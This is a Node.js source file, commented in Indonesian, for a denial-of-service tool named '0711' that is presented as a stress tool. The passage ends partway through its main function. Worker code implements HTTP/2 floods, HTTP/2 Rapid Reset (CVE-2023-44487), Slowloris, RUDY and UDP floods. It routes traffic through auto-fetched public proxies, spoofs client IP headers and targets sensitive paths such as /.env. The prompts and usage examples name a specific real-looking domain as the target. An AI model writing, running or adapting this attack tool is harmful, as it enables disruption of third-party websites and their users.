#!/usr/bin/env node


// ===== Impor Modul =====
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');
const url = require('url');
const fs = require('fs');
const path = require('path');
const dns = require('dns').promises;
const http = require('http');
const https = require('https');
const net = require('net');
const tls = require('tls');
const readline = require('readline');
const { promisify } = require('util');
const sleep = promisify(setTimeout);

// ===== Konfigurasi Default =====
const CONFIG = {
    target: null,
    targets: [],
    ports: [443, 80],
    workersPerPort: 5,
    duration: 60,
    attackType: 'https',
    attackMode: 'normal',
    method: 'GET',
    proxyAuto: false,
    proxyFile: null,
    proxySources: [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://proxylist.rip/proxy/http/format/txt/',
    ],
    userAgentsFile: null,
    payloadsFile: null,
    outputDir: './reports',
    dashboard: false,
    dashboardPort: 8080,
    logFile: '0711.log',
    verbose: false,
    maxConsecutiveFailures: 3,
    maxErrorsPerWorker: 5000,
    backoffBase: 1000,
    maxBackoff: 30000,
    customHeaders: {},
    sslVerify: false,
    payloads: [
        '/wp-admin', '/wp-login.php', '/wp-json/wp/v2/users', '/xmlrpc.php',
        '/api/v1/users', '/api/v1/login', '/api/v1/search',
        '/index.php', '/admin', '/login', '/dashboard', '/panel',
        '/config.php', '/.env', '/.git/config', '/backup.sql',
        '/phpinfo.php', '/server-status', '/.htaccess'
    ],
};

// ===== Utility =====
const logger = {
    _target: '',
    _verbose: false,
    info: (msg) => console.log(`\x1b[36m[INFO]\x1b[0m ${msg}`),
    success: (msg) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${msg}`),
    warn: (msg) => console.log(`\x1b[33m[WARN]\x1b[0m ${msg}`),
    error: (msg) => console.log(`\x1b[31m[ERROR]\x1b[0m ${msg}`),
    debug: (msg) => { if (logger._verbose) console.log(`\x1b[90m[DEBUG]\x1b[0m ${msg}`); },
    attack: (msg) => {
        const target = logger._target || 'UNKNOWN';
        console.log(`\x1b[35m[0711 ATTACK]\x1b[0m \x1b[33m(${target})\x1b[0m ${msg}`);
    }
};

// ===== Spinner =====
class Spinner {
    constructor(text) {
        this.text = text;
        this.frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
        this.interval = null;
        this.current = 0;
    }
    start() {
        if (this.interval) return;
        this.interval = setInterval(() => {
            const frame = this.frames[this.current % this.frames.length];
            readline.cursorTo(process.stdout, 0);
            process.stdout.write(`\x1b[36m${frame}\x1b[0m ${this.text}`);
            this.current++;
        }, 80);
    }
    stop() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
            readline.cursorTo(process.stdout, 0);
            readline.clearLine(process.stdout, 0);
            process.stdout.write(`\x1b[32m✓\x1b[0m ${this.text}\n`);
        }
    }
}

// ===== Interactive Input =====
function interactivePrompt(question) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => {
        rl.question(`\x1b[36m${question}\x1b[0m `, answer => {
            rl.close();
            resolve(answer.trim());
        });
    });
}

async function interactiveSetup() {
    console.log('\n\x1b[35m═══════════════════════════════════════════════════════');
    console.log('\x1b[35m     🔱 0711 – INTERACTIVE SETUP');
    console.log('\x1b[35m═══════════════════════════════════════════════════════\n');

    const config = { ...CONFIG };

    let target = await interactivePrompt('Target URL/IP (contoh: tamari.org.il):');
    while (!target) {
        logger.error('Target tidak boleh kosong!');
        target = await interactivePrompt('Target URL/IP:');
    }
    config.target = target;
    config.targets = [target];
    logger._target = target;

    const portsInput = await interactivePrompt('Ports (pisah koma, default: 443,80):');
    if (portsInput) {
        config.ports = portsInput.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p) && p > 0);
    }

    const workersInput = await interactivePrompt('Workers per port (default: 5):');
    if (workersInput) {
        const w = parseInt(workersInput);
        if (!isNaN(w) && w > 0) config.workersPerPort = w;
    }

    const durationInput = await interactivePrompt('Duration (detik, default: 60):');
    if (durationInput) {
        const d = parseInt(durationInput);
        if (!isNaN(d) && d > 0) config.duration = d;
    }

    console.log('\n\x1b[33mPilih Mode Serangan:');
    console.log('  1. normal     - HTTP/2 flood standar');
    console.log('  2. rapid_reset - HTTP/2 Rapid Reset (CVE-2023-44487)');
    console.log('  3. slowloris  - Tahan koneksi (Slowloris)');
    console.log('  4. rudy       - Slow POST dengan payload besar');
    const modeChoice = await interactivePrompt('Pilih mode (1-4, default: 1):');
    const modeMap = { '1': 'normal', '2': 'rapid_reset', '3': 'slowloris', '4': 'rudy' };
    config.attackMode = modeMap[modeChoice] || 'normal';

    const methodInput = await interactivePrompt('HTTP Method (GET/POST, default: GET):');
    if (methodInput) config.method = methodInput.toUpperCase();

    const useProxy = await interactivePrompt('Gunakan proxy? (y/n, default: n):');
    if (useProxy.toLowerCase() === 'y') {
        const proxyType = await interactivePrompt('Auto fetch dari internet? (y/n):');
        if (proxyType.toLowerCase() === 'y') {
            config.proxyAuto = true;
        } else {
            const proxyFile = await interactivePrompt('File proxy (path, contoh: proxies.txt):');
            if (proxyFile && fs.existsSync(proxyFile)) {
                config.proxyFile = proxyFile;
            } else {
                logger.warn('File tidak ditemukan, proxy dinonaktifkan.');
            }
        }
    }

    const useDashboard = await interactivePrompt('Aktifkan dashboard? (y/n, default: n):');
    if (useDashboard.toLowerCase() === 'y') {
        config.dashboard = true;
        const portInput = await interactivePrompt('Port dashboard (default: 8080):');
        if (portInput) {
            const p = parseInt(portInput);
            if (!isNaN(p) && p > 0) config.dashboardPort = p;
        }
    }

    const verboseInput = await interactivePrompt('Tampilkan log detail? (y/n, default: n):');
    if (verboseInput.toLowerCase() === 'y') config.verbose = true;

    console.log('\n\x1b[32m✓ Konfigurasi selesai!\n');
    return config;
}

// ===== Parser CLI =====
function parseArgs() {
    const args = process.argv.slice(2);
    const parsed = {};
    for (let i = 0; i < args.length; i++) {
        let arg = args[i];
        let key, value;
        if (arg.startsWith('--') && arg.includes('=')) {
            [key, value] = arg.slice(2).split('=', 2);
            parsed[key] = value;
            continue;
        }
        if (arg.startsWith('--')) {
            key = arg.slice(2);
            const next = args[i + 1];
            if (next && !next.startsWith('--')) {
                value = next;
                i++;
            } else {
                value = true;
            }
            parsed[key] = value;
        }
    }
    return parsed;
}

function normalizeTarget(input) {
    if (!input) return input;
    let cleaned = input.trim();
    cleaned = cleaned.replace(/^https?:\/\//, '');
    cleaned = cleaned.replace(/\/$/, '');
    if (cleaned.startsWith('[') && cleaned.includes(']')) {
        const match = cleaned.match(/^\[([^\]]+)\](?::(\d+))?$/);
        if (match) return match[1];
    }
    cleaned = cleaned.split(':')[0];
    return cleaned;
}

// ===== Worker file name =====
const WORKER_FILE_NAME = '0711_worker.js';

// ===== Worker Code as array (safe) =====
const WORKER_CODE_LINES = [
`(async () => {`,
`const { parentPort, workerData } = require('worker_threads');`,
`const net = require('net');`,
`const tls = require('tls');`,
`const crypto = require('crypto');`,
`const dgram = require('dgram');`,
`const http2 = require('http2');`,
`const http = require('http');`,
``,
`const {`,
`    targetIP, port, attackType, attackMode, durationMs, httpMethod,`,
`    workerId, USER_AGENTS, CHARSET, proxyList, payloadTemplates,`,
`    maxConsecutiveFailures, maxErrorsPerWorker, backoffBase, maxBackoff, verbose, customHeaders,`,
`} = workerData;`,
``,
`let sent = 0, active = 0, errors = 0, serverErrors = 0;`,
`let isStopping = false, isPaused = false;`,
`let consecutiveFailures = 0;`,
`let socket = null, tlsConn = null, http2Client = null;`,
`let durationTimer = null;`,
`let currentProxyIndex = 0;`,
``,
`const localUA = USER_AGENTS || ['HydraWorker'];`,
`const charset = CHARSET || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';`,
``,
`function rand(n) { return Math.floor(Math.random() * n); }`,
`function randStr(len) { let s=''; for(let i=0;i<len;i++) s+=charset[rand(charset.length)]; return s; }`,
`function randUA() { return localUA[rand(localUA.length)]; }`,
`function randIP() { return \`\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}\`; }`,
`function randPayload() { return payloadTemplates && payloadTemplates.length ? payloadTemplates[rand(payloadTemplates.length)] : '/'; }`,
`function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }`,
`function getProxy() {`,
`    if (!proxyList || proxyList.length === 0) return null;`,
`    const p = proxyList[currentProxyIndex % proxyList.length];`,
`    currentProxyIndex++;`,
`    return p;`,
`}`,
``,
`const CIPHER_LIST = [`,
`    'ECDHE-RSA-AES128-GCM-SHA256',`,
`    'ECDHE-ECDSA-AES128-GCM-SHA256',`,
`    'ECDHE-RSA-AES256-GCM-SHA384',`,
`    'ECDHE-ECDSA-AES256-GCM-SHA384',`,
`    'ECDHE-RSA-AES128-SHA256',`,
`    'ECDHE-ECDSA-AES128-SHA256',`,
`    'ECDHE-RSA-AES256-SHA384',`,
`    'ECDHE-ECDSA-AES256-SHA384',`,
`    'AES128-GCM-SHA256',`,
`    'AES256-GCM-SHA384',`,
`    'AES128-SHA256',`,
`    'AES256-SHA256',`,
`];`,
`function randomCiphers() {`,
`    const shuffled = CIPHER_LIST.sort(() => Math.random() - 0.5);`,
`    return shuffled.slice(0, Math.min(5 + rand(5), shuffled.length)).join(':');`,
`}`,
``,
`function sendStats(extra = {}) {`,
`    parentPort.postMessage({`,
`        type: 'stats',`,
`        sent: sent,`,
`        active: active,`,
`        errors: errors,`,
`        serverErrors: serverErrors,`,
`        ...extra,`,
`    });`,
`}`,
`function sendLog(message) {`,
`    parentPort.postMessage({ type: 'log', message: message });`,
`}`,
`function cleanup(reason) {`,
`    if (isStopping) return;`,
`    isStopping = true;`,
`    if (durationTimer) { clearTimeout(durationTimer); durationTimer = null; }`,
`    if (http2Client && !http2Client.destroyed) {`,
`        http2Client.destroy();`,
`        http2Client = null;`,
`    }`,
`    if (tlsConn && !tlsConn.destroyed) {`,
`        tlsConn.destroy();`,
`        tlsConn = null;`,
`    }`,
`    if (socket && !socket.destroyed) {`,
`        socket.destroy();`,
`        socket = null;`,
`    }`,
`    active = 0;`,
`    sendStats({ workerId, reason });`,
`    parentPort.postMessage({ type: 'done', workerId });`,
`}`,
``,
`if (durationMs && durationMs > 0) {`,
`    durationTimer = setTimeout(() => cleanup('Duration limit reached'), durationMs);`,
`}`,
``,
`parentPort.on('message', (msg) => {`,
`    if (msg.type === 'stop') cleanup('Received stop');`,
`    if (msg.type === 'pause') isPaused = true;`,
`    if (msg.type === 'resume') isPaused = false;`,
`});`,
``,
`// --- HTTP/2 Normal ---`,
`async function http2NormalAttack() {`,
`    let statsCounter = 0;`,
`    while (!isStopping) {`,
`        if (isPaused) { await sleep(100); continue; }`,
`        sent++;`,
`        statsCounter++;`,
`        if (errors > maxErrorsPerWorker) {`,
`            cleanup(\`Too many errors (\${maxErrorsPerWorker})\`);`,
`            return;`,
`        }`,
`        let errorLogged = false;`,
`        try {`,
`            const proxy = getProxy();`,
`            let proxySocket = null;`,
`            if (proxy) {`,
`                const [proxyHost, proxyPort] = proxy.split(':');`,
`                proxySocket = net.connect(proxyPort, proxyHost);`,
`                await new Promise((resolve, reject) => {`,
`                    proxySocket.once('data', (data) => {`,
`                        if (data.toString().includes('200 Connection established')) resolve();`,
`                        else reject(new Error('Proxy CONNECT failed'));`,
`                    });`,
`                    proxySocket.once('error', reject);`,
`                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);`,
`                });`,
`                tlsConn = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    socket: proxySocket,`,
`                    rejectUnauthorized: false,`,
`                    ciphers: randomCiphers(),`,
`                });`,
`            } else {`,
`                tlsConn = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    rejectUnauthorized: false,`,
`                    ciphers: randomCiphers(),`,
`                });`,
`            }`,
`            active = 1;`,
`            if (statsCounter % 10 === 0) sendStats();`,
``,
`            const scheme = port === 443 ? 'https' : 'http';`,
`            http2Client = http2.connect(\`\${scheme}://\${targetIP}:\${port}\`, { createConnection: () => tlsConn });`,
`            http2Client.on('error', (err) => {`,
`                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }`,
`                http2Client.destroy();`,
`            });`,
``,
`            const payload = randPayload();`,
`            const method = httpMethod || 'GET';`,
`            const headers = {`,
`                ':method': method,`,
`                ':path': payload + '?' + randStr(12) + '=' + randStr(8),`,
`                ':scheme': scheme,`,
`                ':authority': targetIP + ':' + port,`,
`                'user-agent': randUA(),`,
`                'accept': '*/*',`,
`                'accept-encoding': 'gzip, deflate, br',`,
`                'accept-language': 'en-US,en;q=0.9',`,
`                'cache-control': 'no-cache',`,
`                'x-forwarded-for': randIP(),`,
`                'x-real-ip': randIP(),`,
`                'referer': 'https://' + randStr(8) + '.com/',`,
`            };`,
`            if (customHeaders) Object.assign(headers, customHeaders);`,
``,
`            const req = http2Client.request(headers);`,
`            req.on('response', (response) => {`,
`                consecutiveFailures = 0;`,
`                const status = response.headers[':status'] || 0;`,
`                if (status >= 400 && status < 600) serverErrors++;`,
`                sendStats();`,
`                req.destroy();`,
`                if (http2Client && !http2Client.destroyed) {`,
`                    http2Client.destroy();`,
`                    http2Client = null;`,
`                }`,
`                if (tlsConn && !tlsConn.destroyed) {`,
`                    tlsConn.destroy();`,
`                    tlsConn = null;`,
`                }`,
`                if (socket && !socket.destroyed) {`,
`                    socket.destroy();`,
`                    socket = null;`,
`                }`,
`                active = 0;`,
`            });`,
`            req.on('error', (err) => {`,
`                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }`,
`                req.destroy();`,
`                if (http2Client && !http2Client.destroyed) {`,
`                    http2Client.destroy();`,
`                    http2Client = null;`,
`                }`,
`                if (tlsConn && !tlsConn.destroyed) {`,
`                    tlsConn.destroy();`,
`                    tlsConn = null;`,
`                }`,
`                if (socket && !socket.destroyed) {`,
`                    socket.destroy();`,
`                    socket = null;`,
`                }`,
`                active = 0;`,
`            });`,
`            req.end();`,
`            await sleep(10 + rand(20));`,
`        } catch (err) {`,
`            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }`,
`            if (consecutiveFailures >= maxConsecutiveFailures) {`,
`                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);`,
`                return;`,
`            }`,
`            if (http2Client && !http2Client.destroyed) {`,
`                http2Client.destroy();`,
`                http2Client = null;`,
`            }`,
`            if (tlsConn && !tlsConn.destroyed) {`,
`                tlsConn.destroy();`,
`                tlsConn = null;`,
`            }`,
`            if (socket && !socket.destroyed) {`,
`                socket.destroy();`,
`                socket = null;`,
`            }`,
`            active = 0;`,
`            await sleep(2000 + rand(3000));`,
`        }`,
`    }`,
`}`,
``,
`// --- Rapid Reset ---`,
`async function http2RapidResetAttack() {`,
`    let statsCounter = 0;`,
`    while (!isStopping) {`,
`        if (isPaused) { await sleep(100); continue; }`,
`        sent++;`,
`        statsCounter++;`,
`        if (errors > maxErrorsPerWorker) {`,
`            cleanup(\`Too many errors (\${maxErrorsPerWorker})\`);`,
`            return;`,
`        }`,
`        let errorLogged = false;`,
`        try {`,
`            const proxy = getProxy();`,
`            let proxySocket = null;`,
`            if (proxy) {`,
`                const [proxyHost, proxyPort] = proxy.split(':');`,
`                proxySocket = net.connect(proxyPort, proxyHost);`,
`                await new Promise((resolve, reject) => {`,
`                    proxySocket.once('data', (data) => {`,
`                        if (data.toString().includes('200 Connection established')) resolve();`,
`                        else reject(new Error('Proxy CONNECT failed'));`,
`                    });`,
`                    proxySocket.once('error', reject);`,
`                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);`,
`                });`,
`                tlsConn = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    socket: proxySocket,`,
`                    rejectUnauthorized: false,`,
`                    ciphers: randomCiphers(),`,
`                });`,
`            } else {`,
`                tlsConn = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    rejectUnauthorized: false,`,
`                    ciphers: randomCiphers(),`,
`                });`,
`            }`,
`            active = 1;`,
`            if (statsCounter % 10 === 0) sendStats();`,
``,
`            const scheme = port === 443 ? 'https' : 'http';`,
`            http2Client = http2.connect(\`\${scheme}://\${targetIP}:\${port}\`, { createConnection: () => tlsConn });`,
`            http2Client.on('error', (err) => {`,
`                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }`,
`                http2Client.destroy();`,
`            });`,
``,
`            const payload = randPayload();`,
`            const method = httpMethod || 'GET';`,
`            const headers = {`,
`                ':method': method,`,
`                ':path': payload + '?' + randStr(12) + '=' + randStr(8),`,
`                ':scheme': scheme,`,
`                ':authority': targetIP + ':' + port,`,
`                'user-agent': randUA(),`,
`                'accept': '*/*',`,
`                'accept-encoding': 'gzip, deflate, br',`,
`                'accept-language': 'en-US,en;q=0.9',`,
`                'cache-control': 'no-cache',`,
`                'x-forwarded-for': randIP(),`,
`                'x-real-ip': randIP(),`,
`                'referer': 'https://' + randStr(8) + '.com/',`,
`            };`,
`            if (customHeaders) Object.assign(headers, customHeaders);`,
``,
`            const streams = [];`,
`            for (let i = 0; i < 20; i++) {`,
`                const req = http2Client.request(headers);`,
`                req.on('error', () => {});`,
`                req.end();`,
`                streams.push(req);`,
`            }`,
`            for (const req of streams) req.destroy();`,
`            if (http2Client && !http2Client.destroyed) {`,
`                http2Client.destroy();`,
`                http2Client = null;`,
`            }`,
`            if (tlsConn && !tlsConn.destroyed) {`,
`                tlsConn.destroy();`,
`                tlsConn = null;`,
`            }`,
`            if (socket && !socket.destroyed) {`,
`                socket.destroy();`,
`                socket = null;`,
`            }`,
`            active = 0;`,
`            await sleep(1 + rand(5));`,
`        } catch (err) {`,
`            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }`,
`            if (consecutiveFailures >= maxConsecutiveFailures) {`,
`                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);`,
`                return;`,
`            }`,
`            if (http2Client && !http2Client.destroyed) {`,
`                http2Client.destroy();`,
`                http2Client = null;`,
`            }`,
`            if (tlsConn && !tlsConn.destroyed) {`,
`                tlsConn.destroy();`,
`                tlsConn = null;`,
`            }`,
`            if (socket && !socket.destroyed) {`,
`                socket.destroy();`,
`                socket = null;`,
`            }`,
`            active = 0;`,
`            await sleep(100 + rand(300));`,
`        }`,
`    }`,
`}`,
``,
`// --- Slowloris (dengan proxy) ---`,
`async function slowlorisAttack() {`,
`    while (!isStopping) {`,
`        if (isPaused) { await sleep(100); continue; }`,
`        sent++;`,
`        if (errors > maxErrorsPerWorker) {`,
`            cleanup(\`Too many errors (\${maxErrorsPerWorker})\`);`,
`            return;`,
`        }`,
`        let errorLogged = false;`,
`        try {`,
`            const proxy = getProxy();`,
`            let socket;`,
`            if (proxy) {`,
`                const [proxyHost, proxyPort] = proxy.split(':');`,
`                const proxySocket = net.connect(proxyPort, proxyHost);`,
`                await new Promise((resolve, reject) => {`,
`                    proxySocket.once('data', (data) => {`,
`                        if (data.toString().includes('200 Connection established')) resolve();`,
`                        else reject(new Error('Proxy CONNECT failed'));`,
`                    });`,
`                    proxySocket.once('error', reject);`,
`                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);`,
`                });`,
`                socket = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    socket: proxySocket,`,
`                    rejectUnauthorized: false,`,
`                });`,
`            } else {`,
`                socket = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    rejectUnauthorized: false,`,
`                });`,
`            }`,
`            const req = http.request({`,
`                socket: socket,`,
`                host: targetIP,`,
`                port: port,`,
`                method: 'GET',`,
`                path: randPayload() + '?' + randStr(12),`,
`                headers: {`,
`                    'User-Agent': randUA(),`,
`                    'Accept': '*/*',`,
`                    'Accept-Encoding': 'identity',`,
`                    'Connection': 'keep-alive',`,
`                    'Cache-Control': 'no-cache',`,
`                    'X-Forwarded-For': randIP(),`,
`                },`,
`                rejectUnauthorized: false,`,
`            });`,
`            if (customHeaders) Object.assign(req.headers, customHeaders);`,
`            req.setTimeout(30000);`,
`            req.on('error', (err) => {`,
`                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`            });`,
`            req.write(\`X-Slowloris: \${randStr(20)}\\r\\n\`);`,
`            const interval = setInterval(() => {`,
`                if (isStopping || req.destroyed) { clearInterval(interval); return; }`,
`                req.write(\`X-KeepAlive: \${randStr(10)}\\r\\n\`);`,
`            }, 5000 + rand(5000));`,
`            while (!isStopping && !req.destroyed) await sleep(100);`,
`            clearInterval(interval);`,
`            req.destroy();`,
`        } catch (err) {`,
`            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`            if (consecutiveFailures >= maxConsecutiveFailures) {`,
`                cleanup(\`Max failures reached\`);`,
`                return;`,
`            }`,
`            await sleep(2000 + rand(3000));`,
`        }`,
`    }`,
`}`,
``,
`// --- RUDY (dengan proxy) ---`,
`async function rudyAttack() {`,
`    while (!isStopping) {`,
`        if (isPaused) { await sleep(100); continue; }`,
`        sent++;`,
`        if (errors > maxErrorsPerWorker) {`,
`            cleanup(\`Too many errors (\${maxErrorsPerWorker})\`);`,
`            return;`,
`        }`,
`        let errorLogged = false;`,
`        try {`,
`            const proxy = getProxy();`,
`            let socket;`,
`            if (proxy) {`,
`                const [proxyHost, proxyPort] = proxy.split(':');`,
`                const proxySocket = net.connect(proxyPort, proxyHost);`,
`                await new Promise((resolve, reject) => {`,
`                    proxySocket.once('data', (data) => {`,
`                        if (data.toString().includes('200 Connection established')) resolve();`,
`                        else reject(new Error('Proxy CONNECT failed'));`,
`                    });`,
`                    proxySocket.once('error', reject);`,
`                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);`,
`                });`,
`                socket = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    socket: proxySocket,`,
`                    rejectUnauthorized: false,`,
`                });`,
`            } else {`,
`                socket = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    rejectUnauthorized: false,`,
`                });`,
`            }`,
`            const payloadSize = 1024 * 1024 * (1 + rand(2));`,
`            const req = http.request({`,
`                socket: socket,`,
`                host: targetIP,`,
`                port: port,`,
`                method: 'POST',`,
`                path: randPayload() + '?' + randStr(12),`,
`                headers: {`,
`                    'User-Agent': randUA(),`,
`                    'Accept': '*/*',`,
`                    'Content-Type': 'application/x-www-form-urlencoded',`,
`                    'Content-Length': payloadSize,`,
`                    'Connection': 'keep-alive',`,
`                    'Cache-Control': 'no-cache',`,
`                    'X-Forwarded-For': randIP(),`,
`                },`,
`                rejectUnauthorized: false,`,
`            });`,
`            if (customHeaders) Object.assign(req.headers, customHeaders);`,
`            req.on('error', (err) => {`,
`                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`            });`,
`            const chunkSize = 1024;`,
`            let sentBytes = 0;`,
`            while (sentBytes < payloadSize && !isStopping && !req.destroyed) {`,
`                const chunk = Buffer.from(randStr(chunkSize));`,
`                req.write(chunk);`,
`                sentBytes += chunkSize;`,
`                await sleep(100 + rand(200));`,
`            }`,
`            req.end();`,
`            sendStats();`,
`        } catch (err) {`,
`            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`            if (consecutiveFailures >= maxConsecutiveFailures) {`,
`                cleanup(\`Max failures reached\`);`,
`                return;`,
`            }`,
`            await sleep(2000 + rand(3000));`,
`        }`,
`    }`,
`}`,
``,
`// --- UDP ---`,
`async function udpAttack() {`,
`    const udpSocket = dgram.createSocket('udp4');`,
`    let errorLogged = false;`,
`    udpSocket.on('error', (err) => {`,
`        if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`    });`,
`    udpSocket.on('message', () => { serverErrors++; sendStats(); });`,
`    const startTime = Date.now();`,
`    let statsCounter = 0;`,
`    while (!isStopping) {`,
`        if (isPaused) { await sleep(100); continue; }`,
`        sent++;`,
`        statsCounter++;`,
`        if (errors > maxErrorsPerWorker) {`,
`            cleanup(\`Too many errors (\${maxErrorsPerWorker})\`);`,
`            return;`,
`        }`,
`        if (durationMs && Date.now() - startTime > durationMs) break;`,
`        try {`,
`            const payload = Buffer.from(randStr(1400));`,
`            udpSocket.send(payload, port, targetIP, (err) => {`,
`                if (err) {`,
`                    if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`                } else {`,
`                    if (statsCounter % 10 === 0) sendStats();`,
`                }`,
`            });`,
`            await sleep(1 + rand(10));`,
`        } catch (e) {`,
`            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`        }`,
`    }`,
`    udpSocket.close();`,
`    cleanup('UDP finished');`,
`}`,
``,
`let timeoutCounter = 0;`,
`const timeoutInterval = setInterval(() => {`,
`    if (isStopping) { clearInterval(timeoutInterval); return; }`,
`    timeoutCounter++;`,
`    if (timeoutCounter % 2 === 0) sendLog('Request Timed Out');`,
`}, 2000);`,
``,
`if (attackType === 'udp') {`,
`    await udpAttack();`,
`} else if (attackType === 'https') {`,
`    if (attackMode === 'rapid_reset') await http2RapidResetAttack();`,
`    else if (attackMode === 'slowloris') await slowlorisAttack();`,
`    else if (attackMode === 'rudy') await rudyAttack();`,
`    else await http2NormalAttack();`,
`} else {`,
`    // HTTP/1.1 fallback`,
`    let statsCounter = 0;`,
`    while (!isStopping) {`,
`        if (isPaused) { await sleep(100); continue; }`,
`        sent++;`,
`        statsCounter++;`,
`        if (errors > maxErrorsPerWorker) break;`,
`        let errorLogged = false;`,
`        try {`,
`            const proxy = getProxy();`,
`            let socket;`,
`            if (proxy) {`,
`                const [proxyHost, proxyPort] = proxy.split(':');`,
`                const proxySocket = net.connect(proxyPort, proxyHost);`,
`                await new Promise((resolve, reject) => {`,
`                    proxySocket.once('data', (data) => {`,
`                        if (data.toString().includes('200 Connection established')) resolve();`,
`                        else reject(new Error('Proxy CONNECT failed'));`,
`                    });`,
`                    proxySocket.once('error', reject);`,
`                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);`,
`                });`,
`                socket = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    socket: proxySocket,`,
`                    rejectUnauthorized: false,`,
`                });`,
`            } else {`,
`                socket = tls.connect({`,
`                    host: targetIP,`,
`                    port: port,`,
`                    rejectUnauthorized: false,`,
`                });`,
`            }`,
`            const options = {`,
`                socket: socket,`,
`                host: targetIP,`,
`                port: port,`,
`                method: httpMethod || 'GET',`,
`                path: randPayload() + '?' + randStr(12),`,
`                headers: {`,
`                    'User-Agent': randUA(),`,
`                    'Accept': '*/*',`,
`                    'Accept-Encoding': 'gzip, deflate, br',`,
`                    'Accept-Language': 'en-US,en;q=0.9',`,
`                    'Cache-Control': 'no-cache',`,
`                    'X-Forwarded-For': randIP(),`,
`                    'X-Real-IP': randIP(),`,
`                    'Referer': 'https://' + randStr(8) + '.com/',`,
`                },`,
`                rejectUnauthorized: false,`,
`            };`,
`            if (customHeaders) Object.assign(options.headers, customHeaders);`,
`            const req = http.request(options);`,
`            req.on('response', (response) => {`,
`                consecutiveFailures = 0;`,
`                const status = response.statusCode || 0;`,
`                if (status >= 400 && status < 600) serverErrors++;`,
`                if (statsCounter % 10 === 0) sendStats();`,
`                req.destroy();`,
`            });`,
`            req.on('error', (err) => {`,
`                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`            });`,
`            req.end();`,
`            await sleep(10 + rand(20));`,
`        } catch (err) {`,
`            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }`,
`            if (consecutiveFailures >= maxConsecutiveFailures) {`,
`                cleanup('Max failures reached');`,
`                return;`,
`            }`,
`            await sleep(2000 + rand(3000));`,
`        }`,
`    }`,
`}`,
`})();`
];

const WORKER_CODE = WORKER_CODE_LINES.join('\n');

// ===== Main =====
async function main() {
    const cmdArgs = parseArgs();

    if (cmdArgs.help || cmdArgs.h) {
        console.log(`
\x1b[36m🔱 0711 – Ultimate Stress Tool\x1b[0m

\x1b[33mUSAGE:\x1b[0m
  node 0711.js                     # Interactive mode
  node 0711.js --target example.com --workers 10 --duration 30
  node 0711.js --config config.json
  node 0711.js --example-config

\x1b[33mOPTIONS:\x1b[0m
  --target       Target domain/IP
  --targets      File with list of targets
  --ports        Ports (comma separated)
  --workers      Workers per port per target (NO LIMIT)
  --duration     Duration in seconds (0 = unlimited)
  --attack       http, https, udp
  --mode         normal, rapid_reset, slowloris, rudy
  --method       GET, POST, PUT, DELETE
  --proxy-auto   Auto fetch proxies from internet
  --proxy-file   Proxy file (ip:port per line)
  --dashboard    Enable real-time dashboard
  --dashboard-port Dashboard port (default 8080)
  --verbose / -v Verbose output
  --config       JSON config file
  --example-config Print example config
  --help / -h    Show this help

\x1b[33mEXAMPLES:\x1b[0m
  node 0711.js --target tamari.org.il --mode rapid_reset --workers 10
  node 0711.js --target tamari.org.il --proxy-auto --duration 60
  node 0711.js --config config.json
  node 0711.js --example-config > config.json
`);
        process.exit(0);
    }

    if (cmdArgs['example-config'] || cmdArgs['e']) {
        console.log(JSON.stringify(CONFIG, null, 2));
        process.exit(0);
    }

    let config = { ...CONFIG };
    if (cmdArgs.config) {
        try {
            const fileConfig = JSON.parse(fs.readFileSync(cmdArgs.config, 'utf8'));
            config = { ...config, ...fileConfig };
        } catch (e) {
            logger.error(`Gagal load config file: ${e.message}`);
            process.exit(1);
        }
    }

    for (const [key, val] of Object.entries(cmdArgs)) {
        if (val !== undefined) config[key] = val;
    }

    // Interactive jika tidak ada target
